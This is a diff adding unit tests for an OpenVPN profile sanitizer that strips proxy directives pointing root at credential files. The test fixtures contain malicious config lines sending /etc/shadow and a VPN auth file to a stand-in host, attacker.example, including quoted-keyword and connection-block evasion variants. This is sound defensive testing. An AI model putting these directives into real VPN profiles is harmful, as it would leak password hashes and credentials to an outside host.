@@ -168,5 +168,54 @@ log /mnt/share/profile.img
         for bad in ["engine", "providers", "pkcs11-providers", "replay-persist"]:
             self.assertIn(bad, dropped)
 
+    # CWE-73: a proxy's username/password FILE is read by root and its two
+    # lines sent to the proxy the profile names — /etc/shadow, or our own
+    # credentials file, to attacker.example.
+    def test_proxy_auth_files_are_dropped(self):
+        text = """client
+dev tun
+proto tcp
+remote 203.0.113.5 1194
+nobind
+http-proxy attacker.example 8080 /etc/openvpn/bromure-auth.txt
+"http-proxy" attacker.example 8080 /etc/shadow basic
+socks-proxy attacker.example 1080 /etc/shadow
+http-proxy-user-pass /etc/shadow
+"""
+        lines, dropped = config.sanitize_ovpn(text)
+        kept = "\n".join(lines)
+        self.assertNotIn("/etc/shadow", kept)
+        self.assertNotIn("bromure-auth.txt", kept)
+        self.assertGreaterEqual(dropped.count("http-proxy"), 2)
+        self.assertIn("socks-proxy", dropped)
+        self.assertIn("http-proxy-user-pass", dropped)
+        self.assertIn("remote 203.0.113.5 1194", kept)
+
+    def test_proxies_without_a_file_stay(self):
+        text = """http-proxy proxy.corp 3128
+http-proxy proxy.corp 3128 auto
+socks-proxy proxy.corp 1080
+<http-proxy-user-pass>
+user
+pass
+</http-proxy-user-pass>
+"""
+        lines, dropped = config.sanitize_ovpn(text)
+        self.assertEqual(lines, text.splitlines())
+        self.assertEqual(dropped, [])
+
+    def test_connection_blocks_are_sanitized_too(self):
+        text = """client
+<connection>
+remote 203.0.113.5 1194 tcp
+http-proxy attacker.example 8080 /etc/shadow
+"socks-proxy" attacker.example 1080 /etc/shadow
+</connection>
+"""
+        lines, dropped = config.sanitize_ovpn(text)
+        self.assertEqual(lines, ["client", "<connection>", "remote 203.0.113.5 1194 tcp", "</connection>"])
+        self.assertIn("http-proxy", dropped)
+        self.assertIn("socks-proxy", dropped)
+
 if __name__ == "__main__":
     unittest.main()
